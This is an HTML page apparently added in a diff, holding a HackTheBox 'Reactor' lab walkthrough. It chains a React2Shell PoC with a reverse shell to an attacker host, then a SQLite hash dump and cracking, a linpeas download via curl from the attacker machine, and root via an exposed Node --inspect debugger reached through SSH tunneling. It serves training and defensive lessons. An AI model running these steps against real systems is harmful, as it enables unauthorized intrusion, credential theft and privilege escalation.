@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>HTB: Reactor — React2Shell to Root Walkthrough</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    background-color: #0a0e27;
+    color: #e0e0e0;
+    font-family: 'Courier New', monospace;
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 40px 20px;
+    line-height: 1.6;
+  }
+  /* Animated grid background */
+  .bg-animation {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+    opacity: 0.08;
+    background:
+      linear-gradient(90deg, transparent 98%, #00ff88 100%),
+      linear-gradient(0deg, transparent 98%, #00ff88 100%);
+    background-size: 50px 50px;
+    animation: grid-flow 20s linear infinite;
+  }
+  @keyframes grid-flow {
+    0% { transform: translateY(0); }
+    100% { transform: translateY(50px); }
+  }
+  a { color: #66d9ef; text-decoration: none; }
+  a:hover { color: #00ff88; text-decoration: underline; }
+  h1 {
+    color: #00ff88;
+    text-shadow: 0 0 8px rgba(0,255,136,0.5);
+    font-size: 2.2em;
+    margin-bottom: 10px;
+  }
+  h2 {
+    color: #00ff88;
+    border-bottom: 1px solid #1a1f3a;
+    padding-bottom: 8px;
+    margin-top: 50px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  h3 { color: #66d9ef; margin-top: 30px; }
+  .tags { margin: 15px 0 5px 0; }
+  .tag {
+    display: inline-block;
+    background: rgba(0,255,136,0.1);
+    border: 1px solid rgba(0,255,136,0.3);
+    color: #00ff88;
+    padding: 4px 12px;
+    margin-right: 8px;
+    font-size: 0.85em;
+    border-radius: 4px;
+  }
+  .tag.easy {
+    background: rgba(102,217,239,0.2);
+    color: #66d9ef;
+    border-color: #66d9ef;
+  }
+  .meta { color: #888; font-size: 0.9em; margin-bottom: 30px; }
+  .meta b { color: #a0a0a0; }
+  code, pre {
+    background-color: #10152e;
+    border: 1px solid #232a4d;
+    border-radius: 4px;
+  }
+  code { padding: 2px 6px; font-size: 0.95em; color: #66d9ef; }
+  pre {
+    padding: 16px;
+    overflow-x: auto;
+    margin: 16px 0;
+    color: #b8e6c8;
+    border-left: 3px solid #00ff88;
+  }
+  pre code { border: none; padding: 0; color: inherit; background: none; }
+  .callout {
+    background: rgba(102,217,239,0.06);
+    border-left: 3px solid #66d9ef;
+    padding: 12px 18px;
+    margin: 20px 0;
+    color: #b0c4cc;
+  }
+  .deadend {
+    background: rgba(255,68,68,0.06);
+    border-left: 3px solid #ff4444;
+    padding: 12px 18px;
+    margin: 20px 0;
+    color: #d9a3a3;
+  }
+  .divider {
+    border: none;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, #00ff88, transparent);
+    margin: 40px 0;
+  }
+  ul, ol { padding-left: 22px; }
+  li { margin-bottom: 6px; }
+  .back { display: inline-block; margin-bottom: 30px; color: #66d9ef; }
+  table { border-collapse: collapse; width: 100%; margin: 16px 0; }
+  th, td { border: 1px solid #232a4d; padding: 8px 12px; text-align: left; font-size: 0.9em; }
+  th { color: #00ff88; background: rgba(0,255,136,0.05); text-transform: uppercase; letter-spacing: 1px; }
+</style>
+</head>
+<body>
+
+<div class="bg-animation"></div>
+
+<a class="back" href="index.html#writeups">&larr; Back to all writeups</a>
+
+<h1>HTB: Reactor — React2Shell to Root Walkthrough</h1>
+
+<div class="tags">
+  <span class="tag">HACKTHEBOX</span>
+  <span class="tag easy">EASY</span>
+  <span class="tag">LINUX</span>
+  <span class="tag">SEASON 11</span>
+  <span class="tag">FRAMEWORK-LEVEL RCE</span>
+</div>
+
+<div class="meta">
+  Author: th3_m4d_h4ck3r &nbsp;|&nbsp; Framework: Scarif Operations
+</div>
+
+<h2>&gt; OVERVIEW</h2>
+
+<p>Reactor presents as a fake nuclear reactor monitoring dashboard, "ReactorWatch," built on Next.js.
+The interesting part of this box is that the entry point isn't custom application logic at all —
+it's a framework-level vulnerability in React itself. No amount of manual route enumeration or
+directory brute-forcing surfaces it; the only way in is recognizing the tech stack and matching it
+against a very recent, very loud CVE. The chain:</p>
+
+<ol>
+  <li><b>Unauthenticated RCE</b> via CVE-2025-55182 ("React2Shell"), a deserialization bug in the
+    React Server Components Flight protocol</li>
+  <li><b>Foothold as <code>node</code></b> via reverse shell</li>
+  <li><b>Credential extraction</b> from an exposed SQLite database sitting in the app root</li>
+  <li><b>Hash cracking</b> — unsalted MD5, cracked in seconds against rockyou</li>
+  <li><b>SSH as <code>engineer</code></b>, user flag</li>
+  <li><b>Root</b> via abuse of a root-owned Node.js process running with <code>--inspect</code>,
+    reached through SSH port forwarding and the Chrome DevTools Protocol</li>
+</ol>
+
+<hr class="divider">
+
+<h2>&gt; RECONNAISSANCE</h2>
+
+<pre>nmap -sC -sV -p- --min-rate 5000 --disable-arp-ping &lt;TARGET_IP&gt; -oN nmap_initial.txt</pre>
+
+<p>Results:</p>
+<ul>
+  <li><b>22</b> — OpenSSH</li>
+  <li><b>3000</b> — an HTTP service fingerprinting with headers like <code>X-Powered-By: Next.js</code>
+    and, critically, <code>Vary: RSC</code> — confirming React Server Components are active, not just
+    a generic Next.js app</li>
+</ul>
+
+<p>The landing page is "ReactorWatch — Core Monitoring System," a fully static, server-rendered
+dashboard for a fictional "Nuclear Dynamics Corp., Facility Site-7." It lists a few names
+(Dr. Elena Rodriguez, Marcus Kim, James Thompson) as potential usernames, but there's no visible
+login form or interactive functionality anywhere in the UI.</p>
+
+<h3>Dead end: manual route/content enumeration</h3>
+
+<div class="deadend">
+Extensive directory brute-forcing (<code>gobuster</code>, wordlists targeting Next.js API paths,
+vhost fuzzing, build-manifest inspection, source map hunting) turned up nothing actionable. Every
+"hit" was Next.js's own trailing-slash redirect behavior or a generic catch-all 404 page, not a
+real custom route. This is expected: the page is statically prerendered
+(<code>x-nextjs-prerender: 1</code>), and the vulnerability isn't in application code the developers
+wrote — it's in the framework underneath it. No amount of content discovery against a static page
+was ever going to find a bug that lives in React's internal deserializer.
+</div>
+
+<h2>&gt; STAGE 1: IDENTIFYING THE FRAMEWORK BUG</h2>
+
+<p>The <code>Vary: RSC</code> header was the real tell. Once a distinctive, less-common framework
+detail like active React Server Components is fingerprinted, it's worth checking recent CVE
+disclosures for that exact stack before spending more time on manual enumeration. In this case,
+the framework version (Next.js 15.0.3, confirmed via <code>window.next.version</code> in a browser
+console, or via Wappalyzer) matched squarely against
+<b>CVE-2025-55182</b>, publicly nicknamed <b>"React2Shell"</b> — a CVSS 10.0 pre-authentication RCE
+in the RSC "Flight" serialization protocol, affecting any Next.js App Router application using
+React Server Components, including a stock <code>create-next-app</code> project with zero custom
+code.</p>
+
+<div class="callout">
+The proper detection workflow (rather than searching for the box name outright) is: fingerprint the
+stack broadly, then either let a scanner auto-select CVE templates by tag, or manually filter by
+technology tag once the framework is known:
+<pre>nuclei -u &lt;target&gt; -tags nextjs,react
+nuclei -as -u &lt;target&gt;   # automatic scan: fingerprints first, then runs matched CVE templates</pre>
+Once the rough CVE identity is known, the exact signed template can be located directly:
+<pre>grep -rl "55182" ~/nuclei-templates/
+# -> http/cves/2025/CVE-2025-55182.yaml</pre>
+This CVE was disclosed and weaponized within hours — Datadog, Trend Micro, Microsoft, and Unit42 all
+published detailed write-ups within days, and it saw real in-the-wild exploitation delivering
+coin miners and C2 beacons. A framework fingerprint this specific is worth a CVE search on its own,
+independent of any application-specific testing.
+</div>
+
+<p>A number of public PoCs exist with varying reliability; <code>p3ta00/react2shell-poc</code>
+provided a clean, scriptable interface:</p>
+
+<pre>python3 react2shell-poc.py -t http://&lt;TARGET&gt;:3000 --check
+python3 react2shell-poc.py -t http://&lt;TARGET&gt;:3000 -c "id"
+# uid=999(node) gid=988(node) groups=988(node)</pre>
+
+<p>Confirmed RCE as <code>node</code>. Went straight for a reverse shell:</p>
+
+<pre>python3 react2shell-poc.py -t http://&lt;TARGET&gt;:3000 --revshell --lhost &lt;LHOST&gt; --lport 4444</pre>
+
+<h2>&gt; STAGE 2: CREDENTIAL EXTRACTION</h2>
+
+<p>With a shell as <code>node</code>, the application directory was sitting right at
+<code>/opt/reactor-app</code> — and a SQLite database, <code>reactor.db</code>, was right there
+with no access restriction beyond normal file permissions:</p>
+
+<pre>sqlite3 /opt/reactor-app/reactor.db ".tables"
+# sensor_logs  users
+
+sqlite3 /opt/reactor-app/reactor.db "SELECT * FROM users;"
+# 1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
+# 2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb</pre>
+
+<p>Both hashes are unsalted MD5 — 32 hex characters, trivially reversible. Cracked instantly
+against rockyou:</p>
+
+<pre>hashcat -m 0 -a 0 39d97110eafe2a9a68639812cd271e8e /usr/share/wordlists/rockyou.txt
+# 39d97110eafe2a9a68639812cd271e8e:reactor1</pre>
+
+<div class="deadend">
+The <code>admin</code> hash (<code>a203b22191d744a4e70ada5c101b17b8</code>) did not crack against
+rockyou or CrackStation. This account appears to be an unused red herring rather than part of the
+intended chain — <code>engineer</code>'s credentials were sufficient for the full path to root.
+</div>
+
+<pre>ssh engineer@&lt;TARGET_IP&gt;
+# password: reactor1</pre>
+
+<p><b>User flag secured.</b></p>
+
+<h2>&gt; STAGE 3: FINDING THE PRIVESC VECTOR</h2>
+
+<p>With no sudo rights available to <code>engineer</code> (confirmed both by an empty
+<code>sudo -l</code> and by the <code>reactor1</code> password failing sudo authentication per
+<code>auth.log</code>), local enumeration was the next step — run at <i>both</i> privilege stages
+for completeness:</p>
+
+<pre>curl -s http://&lt;LHOST&gt;:8000/linpeas.sh -o linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh -a | tee linpeas_out.txt</pre>
+
+<p>Linpeas flagged the finding immediately — at the very first foothold as <code>node</code>,
+before any privilege escalation had occurred, since process command lines under <code>/proc</code>
+are readable regardless of privilege level:</p>
+
+<pre>root  1409  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js</pre>
+
+<div class="callout">
+This is a documented technique, not a guess. From HackTricks' "Node inspector/CEF debug abuse" page:
+<i>"Always check for possible electron/cef/chromium debuggers running, you could abuse it to
+escalate privileges. Linpeas detect those by checking the <code>--inspect</code> parameter inside
+the command line of the process."</i> Since the debugger has full access to the Node.js execution
+environment, any client able to connect can execute arbitrary JavaScript on behalf of that process —
+and since this process runs as <code>root</code>, that's a direct root primitive.
+</div>
+
+<h3>Why other tools didn't (and shouldn't have) found this</h3>
+
+<table>
+  <tr><th>Tool</th><th>Why it doesn't apply</th></tr>
+  <tr><td>nuclei</td><td>Remote/network vulnerability scanner. The debugger is bound to
+    <code>127.0.0.1</code> only and is a misconfiguration, not a CVE — invisible from outside
+    entirely and outside nuclei's operating model.</td></tr>
+  <tr><td>sqlmap</td><td>Targets SQL injection in HTTP-facing parameters. There was no web-exposed
+    query interface anywhere in this app; the database was read directly off disk after RCE, not
+    through any network-facing input.</td></tr>
+</table>
+
+<h3>Dead ends explored for completeness</h3>
+<div class="deadend">
+<ul>
+  <li><b><code>lxd</code> group membership</b> — <code>engineer</code> is a member of the
+    <code>lxd</code> group, which normally allows privesc via a privileged container mounting the
+    host filesystem. Blocked here: the box has no outbound internet access, so
+    <code>lxd init</code> failed trying to install the LXD snap, and no local image was available
+    to launch a container from. Not the intended path on this isolated lab network.</li>
+  <li><b>sudo</b> — <code>reactor1</code> is not a valid sudo password for <code>engineer</code>,
+    confirmed via a logged authentication failure in <code>auth.log</code>.</li>
+  <li><b>Sudo 1.9.15p5</b> — technically in a vulnerable version range for CVE-2025-32462, but
+    moot here since <code>engineer</code> has no sudoers entry to invoke sudo against in the first
+    place.</li>
+</ul>
+</div>
+
+<h2>&gt; STAGE 4: ROOT VIA NODE INSPECTOR ABUSE</h2>
+
+<p>The debugger listens on <code>127.0.0.1:9229</code> only — but that's not a real barrier once
+you have any local foothold, since SSH port forwarding bypasses the localhost restriction entirely:</p>
+
+<pre>ssh -L 9229:127.0.0.1:9229 engineer@&lt;TARGET_IP&gt;</pre>
+
+<p>With the tunnel up, the debugger is reachable from the attacking machine directly. Rather than
+relying on a full Chromium install and the <code>chrome://inspect</code> GUI, a small script talks
+to the raw Chrome DevTools Protocol WebSocket directly:</p>
+
+<pre>curl -s http://127.0.0.1:9229/json
+# {"webSocketDebuggerUrl": "ws://127.0.0.1:9229/&lt;uuid&gt;", "title": "/opt/uptime-monitor/worker.js", ...}</pre>
+
+<p>Connecting to that WebSocket and issuing a <code>Runtime.evaluate</code> command executes
+arbitrary JavaScript inside the target process — which, since the process runs as <code>root</code>,
+means arbitrary shell commands as root via Node's <code>child_process</code> module:</p>
+
+<pre>require("child_process").execSync("id", {encoding: "utf8"})
+# uid=0(root) gid=0(root) groups=0(root)</pre>
+
+<p><b>Root flag secured.</b></p>
+
+<hr class="divider">
+
+<h2>&gt; LESSONS LEARNED</h2>
+<ul>
+  <li>Not every vulnerability lives in application code — sometimes the framework itself is the
+    attack surface, and no amount of manual route hunting will find a bug that doesn't exist in
+    the app's own logic. Recognizing a distinctive framework signal (here, active RSC) is worth an
+    immediate CVE search.</li>
+  <li>Match the right tool to the right vulnerability class. Nuclei, sqlmap, and linpeas each cover
+    a completely different attack surface (remote network/web CVEs, SQL injection, and local
+    privesc respectively) — a clean scan result from one says nothing about the others.</li>
+  <li><code>--inspect</code> on a production process is a root shell waiting to happen. Binding it
+    to <code>127.0.0.1</code> is not sufficient protection once an attacker has any local foothold;
+    SSH port forwarding trivially bypasses that restriction. Debug flags should never ship to
+    production.</li>
+  <li>Unsalted, uniform hash formats (32-hex MD5 across every account) are a strong signal the
+    underlying secrets are weak — worth cracking immediately rather than assuming they're
+    infeasible.</li>
+  <li>Not every discovered account or group membership (the unused <code>admin</code> hash, the
+    <code>lxd</code> group with no viable image source) is part of the intended path — dead ends
+    are worth documenting so future re-runs don't repeat the same detours.</li>
+  <li>The React2Shell exploit chain can crash the target Next.js process outright rather than
+    cleanly returning control — after exploitation, <code>curl</code> against port 3000 returned
+    connection failures (<code>000</code>) even though the host itself remained fully reachable
+    over SSH and ICMP. Re-running any nuclei/detection tooling against port 3000 afterward will
+    show false "no results" simply because the service is down, not because the check failed.
+    Confirm the web service is actually alive before trusting a clean scan result post-exploitation.</li>
+</ul>
+
+</body>
+</html>
